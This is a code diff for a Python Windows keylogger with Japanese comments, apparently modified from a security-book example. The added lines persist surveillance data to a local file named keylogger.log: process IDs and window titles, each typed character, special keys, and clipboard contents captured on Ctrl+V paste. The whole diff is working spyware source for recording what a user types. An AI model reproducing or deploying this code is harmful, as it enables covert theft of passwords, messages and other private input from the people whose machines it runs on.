@@ -12,6 +12,7 @@ user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
+log_file_path = "./keylogger.log"
 
 
 def get_current_process():
@@ -39,6 +40,10 @@ def get_current_process():
     print("[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
     print()
 
+    f = open(log_file_path, 'a')
+    f.write("[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
+    f.close()
+
     # ハンドルのクローズ
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
@@ -56,6 +61,9 @@ def key_stroke(event):
     # 標準なキーが押下されたかチェック
     if 127 > event.Ascii > 32:
         print(chr(event.Ascii),)
+        f = open(log_file_path, 'a')
+        f.write(chr(event.Ascii),)
+        f.close()
     else:
         # [Ctrl+V]が押下されたならば、クリップボードのデータを取得
         if event.Key == "V":
@@ -64,8 +72,14 @@ def key_stroke(event):
             win32clipboard.CloseClipboard()
 
             print("[PASTE] - %s" % pasted_value,)
+            f = open(log_file_path, 'a')
+            f.write("[PASTE] - %s" % pasted_value,)
+            f.close()
         else:
             print("[%s]" % event.Key,)
+            f = open(log_file_path, 'a')
+            f.write("[%s]" % event.Key,)
+            f.close()
 
     # 登録済みの次のフックに処理を渡す
     return True
